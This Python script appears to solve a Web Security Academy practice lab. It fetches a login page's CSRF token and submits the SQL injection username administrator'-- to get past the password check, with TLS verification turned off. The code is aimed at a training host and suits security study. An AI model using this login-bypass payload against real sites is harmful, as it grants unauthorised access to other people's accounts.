import requests
import bs4 
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_wrong_login(text):
    soup = bs4.BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else:
        error = None
    if error == "Invalid username or password.":
        return False
    return True

def csrf_getter(session, url):
    resp = session.get(url, verify=False)
    soup = bs4.BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]


def form_fill(session, url, username, password):
    csrf = csrf_getter(session, url)
    creds = {"csrf": csrf, "username": username, "password": password}
    r = session.post(url, data=creds, verify=False)
    return r.text


def main():
    host = "https://0af50015046a7796810dde39006800ee.web-security-academy.net"
    product_url = f'{host}/login'
    comment = "--"
    apostrophe = "'"
    username = "administrator"
    password = "a"
    payload = username + apostrophe + comment

    session = requests.Session()
    response_text = form_fill(session, product_url, payload, password)
    if check_wrong_login(response_text):
        print("SQL injection succeeded!")
    else:
        print("SQL injection failed.")


if __name__ == "__main__":
    main()

   

